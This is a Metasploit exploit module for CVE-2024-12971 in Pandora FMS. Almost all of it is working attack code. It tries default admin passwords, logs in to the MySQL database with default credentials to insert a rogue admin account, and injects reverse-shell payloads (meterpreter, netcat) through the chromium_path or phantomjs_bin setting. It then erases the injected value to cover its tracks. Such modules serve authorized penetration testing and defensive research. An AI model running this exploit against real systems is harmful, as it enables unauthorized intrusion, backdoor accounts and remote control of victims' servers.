##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/mysql/client'
require 'digest/md5'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include BCrypt
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  # @!attribute [rw] mysql_client
  # @return [::Rex::Proto::MySQL::Client]
  attr_accessor :mysql_client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Pandora FMS authenticated command injection leading to RCE via chromium_path or phantomjs_bin',
        'Description' => %q{
          Pandora FMS is a monitoring solution that provides full observability for your organization's
          technology. This module exploits an command injection vulnerability in the `chromium-path` or
          `phantomjs-bin` directory setting at the application settings page of Pandora FMS.
          You need have admin access at the Pandora FMS Web application in order to execute this RCE.
          This access can be achieved by knowing the admin credentials to access the web application or
          leveraging a default password vulnerability in Pandora FMS that allows an attacker to access
          the Pandora FMS MySQL database, create a new admin user and gain administrative access to the
          Pandora FMS Web application. This attack can be remotely executed over the WAN as long as the
          MySQL services are exposed to the outside world.
          This issue affects Community, Free and Enterprise editions:
          - chromium-path: from v7.0NG.768 through <= v7.0NG.780
          - phantomjs-bin: from v7.0NG.724 through <= v7.0NG.767

          Note: use target setting 2 "Tiny Reverse Netcat Command" for versions <= v7.0NG.738
        },
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Discovery, Metasploit module & default password weakness
        ],
        'References' => [
          ['CVE', '2024-12971'],
          ['URL', 'https://pandorafms.com/en/security/common-vulnerabilities-and-exposures/'],
          ['URL', 'https://attackerkb.com/topics/BJe14wkMYS/cve-2024-12971']
        ],
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux', 'php'],
        'Privileged' => false,
        'Arch' => [ARCH_CMD, ARCH_PHP],
        'Targets' => [
          [
            'PHP Command',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP,
              'Type' => :php_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              },
              'Payload' => {
                'Encoder' => 'php/base64',
                'BadChars' => "\x20"
              }
            }
          ],
          [
            'Unix/Linux Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse_tcp'
              },
              'Payload' => {
                'Encoder' => 'cmd/base64',
                'BadChars' => "\x20"
              }
            }
          ],
          [
            'Tiny Reverse Netcat Command (use THIS for versions <= v738)',
            {
              'Platform' => ['unix'],
              'Arch' => ARCH_CMD,
              'Type' => :tiny_netcat_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2025-03-17',
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to the Pandora FMS application', '/pandora_console']),
      OptString.new('DB_USER', [true, 'Pandora database admin user', 'pandora']),
      OptString.new('DB_PASSWORD', [true, 'Pandora database admin password', 'Pandor4!']),
      OptString.new('DB_NAME', [true, 'Pandora database', 'pandora']),
      OptPort.new('DB_PORT', [true, 'MySQL database port', 3306]),
      OptString.new('USERNAME', [false, 'Pandora web admin user', 'admin']),
      OptString.new('PASSWORD', [false, 'Pandora web admin password', 'pandora'])
    ])
  end

  # MySQL login
  # returns true if successful else false
  def mysql_login(host, user, password, db, port)
    begin
      self.mysql_client = ::Rex::Proto::MySQL::Client.connect(host, user, password, db, port)
    rescue Errno::ECONNREFUSED
      print_error('Connection refused')
      return false
    rescue ::Rex::Proto::MySQL::Client::ClientError
      print_error('Connection timedout')
      return false
    rescue Errno::ETIMEDOUT
      print_error('Operation timedout')
      return false
    rescue ::Rex::Proto::MySQL::Client::HostNotPrivileged
      print_error('Unable to login from this host due to policy')
      return false
    rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
      print_error('Access denied')
      return false
    rescue StandardError => e
      print_error("Unknown error: #{e.message}")
      return false
    end
    true
  end

  # MySQL query
  # returns query result if successful (can be nil) else returns false
  def mysql_query(sql)
    begin
      res = mysql_client.query(sql)
    rescue ::Rex::Proto::MySQL::Client::Error => e
      print_error("MySQL Error: #{e.class} #{e}")
      return false
    rescue Rex::ConnectionTimeout => e
      print_error("Timeout: #{e.message}")
      return false
    rescue StandardError => e
      print_error("Unknown error: #{e.message}")
      return false
    end
    res
  end

  # login at the Pandora FMS web application
  # return true if login successful else false
  def pandora_login(name, pwd)
    # first login GET request to get csrf code
    # in older versions of Pandora FMS this csrf code is not implemented
    # but for the sake of simplicity we still execute this GET request
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'keep_cookies' => true,
      'vars_get' => {
        'login' => 1
      }
    })
    return false unless res&.code == 200

    # scrape <input id="hidden-csrf_code" name="csrf_code" type="hidden"  value="d3ec1cae43fba8259079038548093ba8" />
    html = res.get_html_document
    csrf_code_html = html.at('input[@id="hidden-csrf_code"]')
    vprint_status("csrf_code_html: #{csrf_code_html}")

    csrf_attributes = csrf_code_html&.attributes
    return false unless csrf_attributes

    csrf_code = csrf_attributes['value']
    return false unless csrf_code

    vprint_status("csrf_code: #{csrf_code}")

    # second login POST request using the csrf code
    # csrf_code can be nil in older versions where the csrf_code is not implemented
    res = send_request_cgi!({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'keep_cookies' => true,
      'vars_get' => {
        'login' => 1
      },
      'vars_post' => {
        'nick' => name,
        'pass' => pwd,
        'Login_button' => "Let's go",
        'csrf_code' => csrf_code
      }
    })
    return false unless res&.code == 200

    res.body.include?('id="welcome-icon-header"') || res.body.include?('id="welcome_panel"') || res.body.include?('godmode')
  end

  # configure directory path setting based on the path_setting chromium_path or phantomjs_bin.
  # return true if successful else false
  def configure_path_setting(path, path_setting)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'keep_cookies' => true,
      'vars_get' => {
        'sec' => 'gsetup',
        'sec2' => 'godmode/setup/setup',
        'section' => 'general',
        'pure' => nil
      },
      'vars_post' => {
        'update_config' => 1,
        'remote_config' => '/var/spool/pandora/data_in',
        'general_network_path' => '/var/spool/pandora/data_in',
        'check_conexion_interval' => 180,
        path_setting.to_s => path.to_s,
        'update_button' => 'Update'
      }
    })
    return res&.code == 200
  end

  # CVE-2024-12971: Command Injection leading to RCE via chromium_path or phantomjs_bin setting
  def execute_command(cmd, vuln_path_setting, _opts = {})
    case target['Type']
    when :php_cmd
      payload = "/;php${IFS}-r\"#{cmd}\";"
    when :unix_cmd
      payload = "/;#{cmd};"
    when :tiny_netcat_cmd
      payload = "/;#{cmd.gsub(' ', '${IFS}')};"
    else
      fail_with(Failure::BadConfig, "Unsupported target type: #{target['Type']}.")
    end
    vprint_status("payload: #{payload}")
    @clean_payload = true
    configure_path_setting(payload, vuln_path_setting)
  end

  def cleanup
    # try to remove the payload from the path settings to cover our tracks
    # but do not run during the check phase
    super
    unless @check_running
      # Disconnect from MySQL server
      mysql_client.close if mysql_client
      # check if payload should be removed
      if @clean_payload
        if @vuln_path_setting == 'chromium_path'
          res = configure_path_setting('/usr/bin/chromium-browser', @vuln_path_setting)
        else
          res = configure_path_setting('/usr/bin', @vuln_path_setting)
        end
        if res
          print_good("Payload is successful removed from #{@vuln_path_setting} path configuration.")
        else
          print_warning("Payload might not be removed from #{@vuln_path_setting} path configuration. Check and try to clean it manually.")
        end
      end
    end
  end

  def check
    @check_running = true
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'keep_cookies' => true
    })
    return CheckCode::Unknown('Received unknown response.') unless res&.code == 200
    unless res.body.include?('PandoraFMS.com') || res.body.include?('Pandora FMS')
      return CheckCode::Safe('Target is not a Pandora FMS application.')
    end

    html = res.get_html_document
    full_version = html.at('div[@id="ver_num"]')
    if full_version.blank?
      @vuln_path_setting = 'chromium_path'
      return CheckCode::Detected("Could not determine the Pandora FMS version. Use exploit with #{@vuln_path_setting} RCE")
    end

    full_version = full_version.text
    version = full_version[1..].sub('NG', '')
    if version.blank?
      @vuln_path_setting = 'chromium_path'
      return CheckCode::Detected("Could not determine the Pandora FMS version. Use exploit with #{@vuln_path_setting} RCE")
    end

    version = Rex::Version.new(version)
    # check if version is between v7.0NG.768 and v7.0NG.780 where the chromium_path setting is vulnerable
    if version >= Rex::Version.new('7.0.768') && version <= Rex::Version.new('7.0.780')
      @vuln_path_setting = 'chromium_path'
      return CheckCode::Appears("Found #{@vuln_path_setting} RCE. Pandora FMS version #{full_version}")
    end
    # check if version is between v7.0NG.724 and v7.0NG.767 where the phantomjs_bin setting is vulnerable
    if version >= Rex::Version.new('7.0.724') && version <= Rex::Version.new('7.0.767')
      @vuln_path_setting = 'phantomjs_bin'
      return CheckCode::Appears("Found #{@vuln_path_setting} RCE. Pandora FMS version #{full_version}")
    end
    CheckCode::Safe("Pandora FMS version #{full_version}")
  end

  def exploit
    @check_running = false
    @vuln_path_setting = 'chromium_path' if @vuln_path_setting.nil?

    # check if we can login at the Pandora Web application with the default admin credentials
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    print_status("Trying to log in with admin credentials #{username}:#{password} at the Pandora FMS Web application.")
    unless pandora_login(username, password)
      # connect to the PostgreSQL DB with default credentials
      print_status('Logging in with admin credentials failed. Trying to connect to the Pandora MySQL server.')
      mysql_login_res = mysql_login(datastore['RHOSTS'], datastore['DB_USER'], datastore['DB_PASSWORD'], datastore['DB_NAME'], datastore['DB_PORT'])
      fail_with(Failure::Unreachable, "Unable to connect to the MySQL server on port #{datastore['DB_PORT']}.") unless mysql_login_res

      # add a new admin user
      username = Rex::Text.rand_text_alphanumeric(5..8).downcase
      password = Rex::Text.rand_password

      # check the password hash algorithm by reading the password hash of the admin user
      # new pandora versions hashes the password in bcrypt $2*$, Blowfish (Unix) format else it is a plain MD5 hash
      mysql_query_res = mysql_query("SELECT password FROM tusuario WHERE id_user = 'admin';")
      fail_with(Failure::BadConfig, 'Cannot find admin credentials to determine password hash algorithm.') if mysql_query_res == false || mysql_query_res.size != 1
      hash = mysql_query_res.fetch_hash
      if hash['password'].match(/^\$2.\$/)
        password_hash = Password.create(password)
      else
        password_hash = Digest::MD5.hexdigest(password)
      end
      print_status("Creating new admin user with credentials #{username}:#{password} for access at the Pandora FMS Web application.")
      mysql_query_res = mysql_query("INSERT INTO tusuario (id_user, password, is_admin) VALUES (\'#{username}\', \'#{password_hash}\', '1');")
      fail_with(Failure::BadConfig, "Adding new admin credentials #{username}:#{password} to the database failed.") if mysql_query_res == false

      # log in with the new admin user credentials at the Pandora FMS Web application
      print_status("Trying to log in with new admin credentials #{username}:#{password} at the Pandora FMS Web application.")
      fail_with(Failure::NoAccess, 'Failed to authenticate at the Pandora FMS application.') unless pandora_login(username, password)
    end
    print_status('Succesfully authenticated at the Pandora FMS Web application.')

    # storing credentials at the msf database
    print_status('Saving admin credentials at the msf database.')
    store_valid_credential(user: username, private: password)

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd, :php_cmd, :tiny_netcat_cmd
      execute_command(payload.encoded, @vuln_path_setting)
    else
      fail_with(Failure::BadConfig, "Unsupported target type: #{target['Type']}.")
    end
  end
end
